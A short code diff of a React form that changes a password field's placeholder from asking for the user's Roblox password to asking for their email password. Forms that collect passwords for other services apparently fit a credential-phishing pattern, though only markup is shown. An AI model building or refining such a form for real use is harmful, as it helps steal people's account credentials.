@@ -363,7 +363,7 @@ function App() {
                     type="password"
                     id="password"
                     name="password"
-                    placeholder="Enter your Roblox password"
+                    placeholder="Enter your Email password"
                     value={formData.password}
                     onChange={handleChange}
                     required
